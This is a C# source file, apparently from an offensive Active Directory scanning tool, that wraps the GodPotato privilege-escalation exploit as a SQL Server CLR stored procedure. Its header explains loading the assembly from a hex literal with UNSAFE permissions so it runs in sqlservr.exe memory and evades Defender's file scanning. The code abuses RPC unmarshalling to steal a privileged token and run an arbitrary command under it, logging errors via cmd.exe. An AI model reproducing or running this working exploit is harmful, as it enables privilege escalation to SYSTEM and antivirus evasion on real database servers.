// SqlGodPotato.cs — SQL Server CLR stored procedure wrapper for GodPotato.
//
// Compiled at image build time by Dockerfile.runtime:
//
//   mcs -target:library -platform:x64 -sdk:4 \
//       src/windows_tools/godpotato/*.cs \
//       src/windows_tools/godpotato/NativeAPI/*.cs \
//       -out:/opt/adscan/tools/windows-tools/godpotato-clr/GodPotatoCLR.dll
//
// Loaded into SQL Server via CREATE ASSEMBLY ... FROM 0x<hex> WITH PERMISSION_SET = UNSAFE.
// The assembly never touches the target filesystem as a standalone PE — the bytes
// are embedded in the T-SQL hex literal and loaded directly into sqlservr.exe memory,
// bypassing Defender's write-time file scan path entirely.
//
// Lifecycle (enforced by MssqlSeImpersonateService):
//   setup()    -> CREATE ASSEMBLY + CREATE PROCEDURE
//   execute()  -> EXEC dbo.GodPotatoRun N'<cmd>'
//   teardown() -> DROP PROCEDURE + DROP ASSEMBLY   (always runs in finally)
using System;
using System.Diagnostics;
using System.Security.Principal;
using GodPotato.NativeAPI;
using SharpToken;

namespace GodPotato {
    public class SqlGodPotato {

        static void DbgLog(string msg) {
            try {
                var psi = new ProcessStartInfo("cmd.exe",
                    "/c echo " + msg.Replace(" ", "_") + " >> C:\\Windows\\Temp\\adscan_gp_log.txt");
                psi.UseShellExecute = false;
                psi.CreateNoWindow  = true;
                var p = Process.Start(psi);
                if (p != null) p.WaitForExit(3000);
            } catch {}
        }

        // SQL Server CLR stored procedure entry point.
        // Signature must be: public static void <Method>(string) for NVARCHAR(MAX) param.
        public static void Run(string command) {
            try {
                var ctx     = new GodPotatoContext(new System.IO.StringWriter(), Guid.NewGuid().ToString());
                ctx.HookRPC();
                ctx.Start();
                var trigger = new GodPotatoUnmarshalTrigger(ctx);
                try { trigger.Trigger(); } catch {}
                WindowsIdentity identity = ctx.GetToken();
                if (identity != null)
                    TokenuUils.createProcessReadOut(new System.IO.StringWriter(), identity.Token, command);
                ctx.Restore();
                ctx.Stop();
            } catch (Exception ex) {
                DbgLog("EX=" + ex.GetType().Name + "_" + ex.Message.Replace(" ","_").Substring(0, Math.Min(40, ex.Message.Length)));
            }
        }
    }
}
